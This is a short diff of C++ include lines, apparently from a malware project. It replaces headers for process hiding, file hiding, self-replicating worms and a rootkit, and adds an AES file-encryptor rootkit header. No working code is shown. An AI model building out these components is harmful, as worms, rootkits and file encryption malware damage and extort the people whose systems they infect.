@@ -5,10 +5,11 @@
 #include "ProcessHider.h" // Include the header for ProcessHider class
 #include "ProcessEnumerator.h" // Include the header for ProcessEnumerator class
 #include "FileHider.h" // Include the header for FileHider class
-#include "WormReplicator.h" // Include the header for WormReplicator class
-#include "EnigmaticWorm.h" // Include the header for EnigmaticWorm class
-#include "MayhemWorm.h" // Include the header for MayhemWorm class
-#include "Rootkit.h" // Include the header for Rootkit class
+#include "eventDrivenWorm.h" // Include the header for WormReplicator class
+#include "enigmaticWorm.h" // Include the header for EnigmaticWorm class
+#include "mayhem_worm_mutator.h" // Include the header for MayhemWorm class
+#include "rootkit_worm.h" // Include the header for Rootkit class
+#include "aes_file_encryptor_rootkit.h"
 
 using namespace std;
 
